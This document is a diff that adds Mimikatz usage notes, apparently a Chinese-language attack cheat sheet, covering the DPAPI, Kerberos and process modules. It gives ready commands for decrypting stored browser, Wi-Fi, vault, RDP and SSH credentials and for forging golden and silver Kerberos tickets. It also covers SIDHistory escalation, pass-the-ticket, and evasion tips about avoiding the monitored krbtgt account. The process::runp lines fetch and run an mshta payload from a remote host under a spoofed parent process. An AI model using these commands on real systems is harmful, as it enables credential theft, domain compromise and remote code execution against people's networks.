@@ -346,12 +346,303 @@ mimikatz # vault::list
 
 # dpapi
 
+## blob
+> describes a DPAPI blob and unprotects/decrypts it with API or Masterkey
+
+```
+mimikatz # dpapi::blob /in:dpapi_blob.txt /unprotect
+```
+
+## cache
+显示DPAPI模块的凭证缓存
+
+```
+mimikatz # dpapi::cache
+```
+
+## capi
+解密一个CryptoAPI的私钥文件
+
+```
+mimikatz # dpapi::capi /in:"D:\\Users\\Gentil Kiwi\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\S-1-5-21-494464150-3436831043-1864828003-1001\\79e1ac78150e8bea8ad238e14d63145b_4f8e7ec6-a506-4d31-9d5a-1e4cbed4997b" /masterkey:f2c9ea33a990c865e985c496fb8915445895d80b
+```
+
+## chrome
+从Chrome中转储的证书和cookies
+```
+mimikatz # dpapi::chrome /in:"C:\Users\m3g9tr0n\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
+```
+
+## cng
+
+> decrypts a given CNG private key file. According to this document, the Crypto Next Generation (CNG) API is a successor of of Crypto API (CAPI).
+
+```
+mimikatz # dpapi::cng /in:"C:\Users\m3g9tr0n\AppData\Roaming\Microsoft\Crypto\Keys\de7cf8a7901d2ad13e5c67c29e5d1662_e4aad2d1-5ec0-4ea4-b259-65eda5bc47a8" /unprotect
+```
+
+
+## create
+
+从原始密钥和元数据创建一个DPAPI主密钥文件。当你想在你的机器上解密一个受害者的DPAPI机密时，它就会派上用场。
+```
+mimikatz # dpapi::create /guid:{5c22983f-77ee-41e4-9086-8073d664e417} /key:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3 /password:Super_SecretPass /protected
+```
+
+## cred
+解密DPAPI保存的凭证，如RDP、计划任务等。
+```
+mimikatz # dpapi::cred /in:%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA10EB8126AA20883E9542812A0F904C
+```
+
+## credhist
+描述了一个Credhist文件。Passcape提到，CREDHIST是一个密码历史文件，做为一个链条，其中每个链接代表用户的旧密码哈希值（NT和SHA1）。每次用户改变密码时，旧的密码哈希值被附加到文件中，并以新的密码进行加密。
+
+```
+mimikatz# dpapi::credhist in:"C:\users<UserName>\appdata\Roaming\Microsoft\Protect\CREDHIST"
+```
+
+## masterkey
+
+描述了一个Masterkey file，并解开了每个Masterkey 的保护（取决于密钥）。换句话说，它可以从活动目录中解密和请求Masterkey 
+
+```
+mimikatz # dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-1719172562-3308538836-3929312420-1104\cc6eb538-28f1-4ab4-adf2-f5594e88f0b2"
+```
+
+## protect
+
+通过DPAPI调用保护数据
+```
+mimikatz # dpapi::protect /data:"Hello Mimikatz"
+
+mimikatz # dpapi::protect /data:"Hello Mimikatz" /c
+
+mimikatz # dpapi::protect /data:"Hello Mimikatz" /out:dpapi_blob.txt  #输出到文件dpapi_blob.txt
+```
+
+## ps
+解密PowerShell凭证（PSCredentials或SecureString）。
+
+```
+mimikatz # dpapi::ps /in:ps_cred.xml /unprotect
+```
+
+## rdg
+
+解密远程桌面网关保存的密码
+```
+mimikatz # dpapi::rdg /in:test.rdg /unprotect
+```
+
+## sccm
+
+用来解密保存的SCCM凭证
+
+```
+mimikatz # dpapi::sccm  /unprotect
+```
+
+
+## ssh
+
+提取OpenSSH私钥
+
+```
+mimikatz # dpapi::ssh /unprotect
+```
+
+## vault
+
+从凭证库中解密DPAPI金库凭证
+
+```
+mimikatz # dpapi::vault /cred:"C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\21CD6FA9B5E4C7D1D04AE0182DD7F440F54E02ED.vcrd" /policy:"C:\Users\m3g9tr0n\AppData\Local\Microsoft\Vault\4BF4C442-9B8A-41A0-B380-DD4A704DDB28\Policy.vpol" /masterkey:3f7a17dd6658319fcd4b832afc20ac7dacbb9d7cd668527c71f98e90464624634c614a7923a3beb23c4e24dd718f2a8e838ce72935fb29f11507affb543a53c3
+```
+
+## wifi
+
+解密保存的Wi-Fi密码
+
+```
+mimikatz # dpapi::wifi /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces\{F4257B8E-3599-4A6F-AEA2-B3B7646ECA80}\{25F4C906-099A-4871-826D-8A604C132954}.xml" /unprotect
+```
+
+## wwan
+
+解密Wwan的证书
+
+```
+mimikatz# dpapi::wwan /in:"C:\ProgramData\Microsoft\Wlansvc\Profiles{interface guid}\*.xml" /unprotect
+```
+
+
 
 # kerberos
 
+## ask
+
+可用于获取服务票证
+```
+mimikatz # kerberos::ask 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi /target:CIFS/dc.hacklab.local
+
+mimikatz # kerberos::ask /rc4 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi /target:HTTP/dc.hacklab.local
+```
+
+## clist
+
+ 以MIT/Heimdall ccache格式列出门票
+```
+mimikatz # kerberos::clist
+```
+
+## golden
+
+可以用来伪造金票和银票。它也可用于伪造域间信任密钥。
+
+金票
+```
+mimikatz # kerberos::golden /domain:hacklab.local /sid:S-1-5-21-2725560159-1428537199-2260736313 /rc4:b5348d0a20a24a67ff544146a09cd292 /user:krbtgt /ticket:ticket.kirbi /groups:500,501,513,512,520,518,519
+```
+
+银票
+```
+mimikatz # kerberos::golden /domain:hacklab.local /sid:S-1-5-21-2725560159-1428537199-2260736313 /rc4:647dac3559c899c5fe4dad7723feb8c5 /user:m3g9tr0n /service:CIFS/dc.hacklab.local /target:dc.hacklab.local
+```
+
+
+**Golden ticket & SIDHistory spoofing**
+当森林信任关系是双向的，有可能通过做SIDHistory欺骗，从一个子域升级到父根域。
+
+```
+mimikatz #kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name> /ticket:ticket.kirbi /sids:<sid_of_parent_domain>
+```
+
+
+**Inter-Realm Trust Tickets**
+要获得森林信任密钥，必须使用 lsadump::trust /patch 命令。根据森林信任关系，使用信任密钥而不是 krbtgt 帐户可能更隐蔽，因为大多数防御机制都在监视 krbtgt 帐户
+
+```
+mimikatz # kerberos::golden /user:<user_name> /domain:<domain_name> /sid:<domain_sid> /sids:<sid_of_target_domain> /rc4:<trust_key_RC4_key> /service:krbtgt /target:<the_target_domain> /ticket:<file_to_save>
+```
+
+## hash
+
+根据给定的明文密码计算出不同的kerberos哈希（NTLM,AES128,AES256）
+
+```
+mimikatz # kerberos::hash /user:m3g9tr0n /domain:hacklab.local /password:Super_SecretPass1!
+```
+
+## list
+
+具有类似于klist命令的功能，而不需要提升权限。与sekurlsa::tickets不同，该模块不与LSASS交互。
+
+```
+mimikatz # kerberos::list
+```
+
+## ptc
+
+可以用来传递缓存。这类似于kerberos::ptt，它确实传递了票据，但不同的是，使用的票据是.ccache票据而不是.kirbi票据。
+```
+mimikatz # kerberos::ptc m3g9tr0n@HACKLAB.LOCAL_krbtgt~HACKLAB.LOCAL@HACKLAB.LOCAL.ccache
+```
+
+## ptt
+
+用于通过在当前会话中注入一个或多个 Kerberos 票据来传递票据。票据可以是TGT（Ticket-Granting Ticket），也可以是ST（Service Ticket）。
+
+```
+mimikatz # kerberos::ptt 0-40e10000-m3g9tr0n@krbtgt~HACKLAB.LOCAL-HACKLAB.LOCAL.kirbi
+```
+
+## purge
+
+清除票据，等价于```klist purge```命令
+```
+mimikatz # kerberos::purge
+```
+
+## tgt
+
+检索当前用户的TGT（Ticket-Granting Ticket）。
+
+```
+mimikatz # kerberos::tgt
+```
 
 # process
 
+## exports
+
+> lists all the exported functions from the DLLs each running process is using. If a```/pid ```is not specified, then exports for mimikatz.exe will be displayed.
+
+```
+mimikatz # process::exports
+
+mimikatz # process::exports /pid:3516
+```
+
+## imports
+
+> lists all the imported functions from the DLLs each running process is using. If a```/pid``` is not specified, then imports for mimikatz.exe will be displayed. 
+
+```
+mimikatz # process::imports
+```
+
+## list
+
+列出所有运行的进程
+```
+mimikatz # process::list
+```
+
+## resume
+ 通过使用NtResumeProcess Windows Native API函数恢复一个暂停的进程。
+```
+mimikatz # process::resume notepad /pid:9212
+```
+
+## run
+
+通过使用CreateProcessAsUser Win32 API函数创建一个进程。CreateEnvironmentBlock也被利用了
+
+```
+mimikatz # process::run notepad
+```
+
+## runp
+在一个父进程下运行一个子进程（默认的父进程是LSASS.exe）。它也可用于横向移动和进程欺骗。
+```
+mimikatz # process::runp /run:notepad.exe
+
+mimikatz # process::runp /run:notepad.exe /ppid:6388   #指定进程
+
+mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948   # mshta攻击负载执行
+
+mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948 /token:1  # 在指定令牌下执行mshta有效负载
+```
+
+## start
+
+通过使用CreateProcess Win32 API函数启动一个进程。该进程的PID也被显示出来
+```
+mimikatz # process::start notepad.exe
+```
+
+## stop
+ 通过使用NtTerminateProcess Windows Native API函数终止一个进程。
+```
+mimikatz # process::stop notepad /pid:6500
+```
+
+## suspend
+通过使用NtSuspendProcess Windows Native API函数暂停一个进程。
+```
+mimikatz # process::suspend notepad /pid:9212
+```
 
 
 # token
